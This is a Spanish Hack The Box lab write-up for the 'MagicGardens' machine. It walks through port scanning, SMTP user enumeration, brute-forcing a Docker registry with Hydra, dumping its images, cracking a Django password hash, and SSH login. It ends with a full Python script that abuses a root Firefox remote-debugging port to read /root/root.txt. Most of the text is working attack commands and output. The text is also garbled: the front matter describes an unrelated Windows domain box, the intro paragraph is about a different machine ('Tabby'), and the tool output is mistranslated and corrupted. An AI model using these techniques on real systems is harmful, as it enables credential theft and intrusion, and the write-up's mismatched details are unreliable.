---
layout: single
title: MagicGardens - Hack The Box
excerpt: "La máquina presenta servicios típicos de Windows, como Kerberos, LDAP, RPC y SMB. Requiere trabajar con túneles SSH y técnicas avanzadas de enumeración en entornos de dominio. Explotación Enfoque en enumeración de Active Directory, usando herramientas como BloodHound, Impacket y Kerbrute. Requiere encontrar credenciales específicas que permiten acceder a servicios restringidos. Escalada de privilegios Implica manipular permisos dentro del dominio o explotar configuraciones incorrectas en los privilegios de los usuarios del sistema. Utiliza técnicas de abuso de servicios internos de Windows. Objetivo final Conseguir acceso a los archivos protegidos (habitualmente root.txt) en el controlador de dominio (Domain Controller)."
date: 2020-11-07
classes: wide
header:
  teaser: /assets/images/htb-writeup-MagicGardens/magic-modified.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - nmap
  - gobuster
  - smtp-user-enu
  - hydra
  - DockerRegistryGrabber
  - sqlite3
  - port forwarding local 
  - manipular permisos
---

![](/assets/images/htb-writeup-MagicGardens/magic-modified.png)

Tabby was an easy box with simple PHP arbitrary file ready, some password cracking, password re-use and abusing LXD group permissions to instantiate a new container as privileged and get root access. I had some trouble finding the tomcat-users.xml file so installed Tomcat locally on my VM and found the proper path for the file.

## Portscan

```
nmap -sCV -p-  10.10.11.9
# Nmap 7.94 scan initiated Thu May 23 13:45:21 2024
Nmap scan report for magicgardens.htb (10.10.11.9)
Host is up (0.098s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)

| ssh-hostkey: 
|   256 e0:72:62:48:99:33:4f:fc:59:f8:6c:05:59:db:a7:7b (ECDSA)
|_  256 62:c6:35:7e:82:3e:b1:0f:9b:6f:5b:ea:fe:c5:85:9a (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: magicgardens.magicgardens.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
80/tcp   open  http     nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Magic Gardens
1337/tcp open  waste?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, TerminalServer, TerminalServerCookie, X11Probe, afp, giop, ms-sql-s: 
|_    [x] Handshake error
5000/tcp open  ssl/http Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Not valid before: 2023-05-23T11:57:43
|_Not valid after:  2024-05-22T11:57:43

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.94SVN%I=7%D=5/25%Time=66523482%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,15,"\[x\]\x20Handshake\x20error\n\0")%r(GetRequest,15,"\[
SF:x\]\x20Handshake\x20error\n\0")%r(HTTPOptions,15,"\[x\]\x20Handshake\x2
SF:0error\n\0")%r(RTSPRequest,15,"\[x\]\x20Handshake\x20error\n\0")%r(RPCC
SF:heck,15,"\[x\]\x20Handshake\x20error\n\0")%r(DNSVersionBindReqTCP,15,"\
SF:[x\]\x20Handshake\x20error\n\0")%r(DNSStatusRequestTCP,15,"\[x\]\x20Han
SF:dshake\x20error\n\0")%r(Help,15,"\[x\]\x20Handshake\x20error\n\0")%r(Te
SF:rminalServerCookie,15,"\[x\]\x20Handshake\x20error\n\0")%r(X11Probe,15,
SF:"\[x\]\x20Handshake\x20error\n\0")%r(FourOhFourRequest,15,"\[x\]\x20Han
SF:dshake\x20error\n\0")%r(LPDString,15,"\[x\]\x20Handshake\x20error\n\0")
SF:%r(LDAPSearchReq,15,"\[x\]\x20Handshake\x20error\n\0")%r(LDAPBindReq,15
SF:,"\[x\]\x20Handshake\x20error\n\0")%r(LANDesk-RC,15,"\[x\]\x20Handshake
SF:\x20error\n\0")%r(TerminalServer,15,"\[x\]\x20Handshake\x20error\n\0")
SF:r(NCP,15,"\[x\]\x20Handshake\x20error\n\0")%r(NotesRPC,15,"\[x\]\x20Han
SF:dshake\x20error\n\0")%r(JavaRMI,15,"\[x\]\x20Handshake\x20error\n\0")%r
SF:(ms-sql-s,15,"\[x\]\x20Handshake\x20error\n\0")%r(afp,15,"\[x\]\x20Hand
SF:shake\x20error\n\0")%r(giop,15,"\[x\]\x20Handshake\x20error\n\0");
Service Info: Host:  magicgardens.magicgardens.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel


Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 185.80 seconds
```

```
gobuster dir -u http://magicgardens.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 150 -x txt,html,php -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://magicgardens.htb
[+] Method:                  GET
[+] Threads:                 150
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/search               (Status: 301) [Size: 0] [--> /search/]
/login                (Status: 301) [Size: 0] [--> /login/]
/register             (Status: 301) [Size: 0] [--> /register/]
/profile              (Status: 301) [Size: 0] [--> /profile/]
/subscribe            (Status: 301) [Size: 0] [--> /subscribe/]
/catalog              (Status: 301) [Size: 0] [--> /catalog/]
/admin                (Status: 301) [Size: 0] [--> /admin/]
/cart                 (Status: 301) [Size: 0] [--> /cart/]
/logout               (Status: 301) [Size: 0] [--> /logout/]
/check                (Status: 301) [Size: 0] [--> /check/]
```

encontre estos directorios pero solo me llama la atencion `admin` y le hecharemos un vistaso a `login`




![](/assets/images/htb-writeup-MagicGardens/flo.png)


SMTP (Simple Mail Transfer Protocol) es un conjunto de directrices de comunicación que permiten a las aplicaciones web realizar tareas de comunicación a través de Internet, incluyendo correos electrónicos. Es parte del protocolo TCP/IP y trabaja en el traslado de correos electrónicos a través de la red. La enumeración SMTP nos permite identificar usuarios válidos en el servidor SMTP. Esto se hace con los comandos SMTP incorporados usando ellos. VRFY Este comando se utiliza para autenticar el usuario. EXPN Este comando muestra la dirección de correo real para alias y listas de correo. RCPT TO Identifica el destinatario del mensaje. La enumeración SMTP es una técnica utilizada para enumerar el servicio SMTP que se ejecuta en el servidor de destino.

```
./smtp-user-enum -U /usr/share/wordlists/SecLists/Usernames/Names/malenames-usa-top1000.txt magicgardens.htb 25
Connecting to magicgardens.htb 25 ...
220 magicgardens.magicgardens.htb ESMTP Postfix (Debian/GNU)
250 magicgardens.magicgardens.htb
Start enumerating users with VRFY mode ...
[----] ALEX        252 2.0.0 ALEX
```

encontramos al usuario `alex`


```
hydra -f -l alex -P /usr/share/wordlists/rockyou.txt 10.10.11.9 -s 5000 https-get /v2/
[DATA] atacándose a http-gets://10.10.11.9:500/v2/
[5000][http-get] host: 10.10.11.9 login: alex contraseña: diamantes
[STATUS] ataque terminado para 10.10.11.9 (pareja válida encontrada)
```
`https://github.com/Syzik/DockerRegistryGrabber`

```
❯ python3 drg.py https://10.10.11.9 -U alex -P diamantes --dump-all
Magicgardens.htb
BlobSum encontró 30
    Descargar : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8c2c2e23955b46d4
    Descargar : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8c2c2e23955b46d4
    Descargar : b0c11cc48cc482dbeea1133c92c9207a3feca9c837d75d769b1c6243938c
    Descargar : 748da8c1c1b87e6667b90ea305e2605e2671b22d046dcfeb189152bf590d594c3b3fc
    Descargas : 81771b31efb31f3fb18dae7d8ca3a93c8c4554aa09239e09d61bcc7ed58d4515
    Descargar : 35bb21a215463f8130302987a19a19d014946cdd82c86d57eebBcfb94d6511a8
    Descargas : 437853d7b910e50d0a0a43b0b77dadec00948a21289a32e6082d44593768eb1
    Descargar : f9afd820562f8d898d894dfed53f4dfed53f9065b928c552cf920e52e804177eff8b2c82
    Descargas : d66316738a2760996cb59c8eb2b28c8c8faa73ced1d98fb75fda661a1c659d6
    Descargar : fedbb0514db0150f23b0f778e5f304c3b333b5b5b53619a994c50da7e9e97ea
```
despues de buscar encontras este script en github con el que crea un montón de archivos zip por DockerRegirstryGrabber
despues de todo eso enumerar los archivos uno por uno, db.sqlite3 se puede encontrar 


![](/assets/images/htb-writeup-MagicGardens/recortar(1).png)


encontramos esto /usr/src/app ojo revisen bien la carpeta es algo interesante lo que puedo decir es se vienen cositas

```
sqlite3 db.sqlite3
SQLite versión 3.45.1 2024-12-11 12:05:40
Introduzca ".help" para las pistas de uso.
sqlite. .tables
auth-group djanscontenttype       
authgroup.permissions django-migrations         
auth-perperpermission django.            
tienda de usuario.               
auth-user-groups store-product             
auth-user-user-permissions store.storemessage        
django.admin.log store-storeuser           
sqlite seleccione * de auth-user;
2opbkdf2-sha256$600000$y1tAjUmiqLtSdpL2wL2h56$61u2yMfKoYyYYXfX4k/0hTc6YXRXXRXXXOH4LYVsEXo=2023-06-06 17:34:34:56.520750-1-morty-1-1-2023-06-06 17:32:24
sqlite.
```

`hashcat -m 10000 hash.txt /usr/share/wordlists/rockyou.txt
:jonasbrothers
`
## ssh morty

es mas que claro que nos conectamos con las credenciales que disponemos
ssh morty@magicgardens.htb

despues de una busqueda enotra mos esto proceso interesante en el puerto 44351: depuración remota

```
root        2028  3.0 11.7 2931088 471084 ?      Sl   11:31   4:05 firefox-esr --marionette --headless --remote-debugging-port 34965 --remote-allow-hosts localhost -no-remote -profile /tmp/

```
```

morty@magicgardens:$ netstat -tlnp
(No se pudieron identificar todos los procesos, info de proceso no propiedad
 no se mostrará, usted tendría que ser raíz para ver todo.)
Conexiones de Internet activa (sólo servidores)
Proto Recv-Q Send-Q Dirección local Dirección extranjera Nombre PID/Programa de PID/Programa    
tcp 0 0 0.0.0.0:80 0.0..0.0:* LISTEN -                   
tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN -                   
tcp 0 0 0.0.0.0:25 0.0.0.0:* LISTEN -                   
tcp 0 0 127.0.0.1:51227 0.0.0.0:* LISTEN -                   
tcp 0 0 127.0.0.1:34965 0.0.0.0:* LISTEN -                   
tcp 0 0 0.0.0.0:5000 0.0.0.0:* LISTEN -                   
tcp 0 0 0.0.0.0:1337 0.0.0.0:* LISTEN -                   
tcp 0 0 127.0.0.1:8000 0.0.0.0:* LISTEN -                   
tcp 0 0 127.0.0.1:40733 0.0.0.0:* LISTEN -
tcp 0 0 127.0.0.1:8080 0.0.0.0:* LISTEN -                   
tcp 0 0 127.0.0.1:38431 0.0.0.0:* LISTEN -                   
tcp6 0 0 :::80 :: *                    
tcp6 0 0 :::22 :: * LISTEN -                   
tcp6 0 0 :::25 :: * LISTEN -                   
tcp6 0 0 :::5000 *: LISTEN -

```
ahora hacemos un para no usar chisel túnel SSH con redirección de puertos local o port forwarding local.

```
❯ ssh morty-magicgardens.htb -L 34965:127.0.0..1:34965
```

Este script se conecta a un navegador con depuración remota habilitada, abre el archivo /root/root.txt en una nueva pestaña, toma una captura de pantalla de su contenido y la guarda como root.png. Utiliza WebSocket para comunicarse con el navegador y ejecutar los comandos necesarios.



```
import json
import requests
import websocket
import base64

debugger_address = 'http://localhost:34965' # Change port

response = requests.get(f'{debugger_address}/json')
tabs = response.json()

web_socket_debugger_url = tabs[0]['webSocketDebuggerUrl'].replace('127.0.0.1', 'localhost')

print(f'Connect to url: {web_socket_debugger_url}')

ws = websocket.create_connection(web_socket_debugger_url, suppress_origin=True)

command = json.dumps({
            "id": 5,
            "method": "Target.createTarget",
            "params": {
                "url": "file:///root/root.txt"
            }
})

ws.send(command)
target_id = json.loads(ws.recv())['result']['targetId']
print(f'Target id: {target_id}')

command = json.dumps({
                "id": 5,
                "method": "Target.attachToTarget",
                "params": {
                    "targetId": target_id,
                    "flatten": True
                }})

ws.send(command)
session_id = json.loads(ws.recv())['params']['sessionId']
print(f'Session id: {session_id}')

command = json.dumps({
            "id": 5,
            "sessionId": session_id,
            "method": "Page.captureScreenshot",
            "params": {
                "sessionId": session_id,
                "format": "png"
            }
        })

ws.send(command)
result = json.loads(ws.recv())

ws.send(command)
result = json.loads(ws.recv())

if 'result' in result and 'data' in result['result']:
    print("Success file reading")
    with open("root.png", "wb") as file:
        file.write(base64.b64decode(result['result']['data']))
else:
    print("Error file reading")

ws.close()

```
![](/assets/images/htb-writeup-MagicGardens/root(1).png)
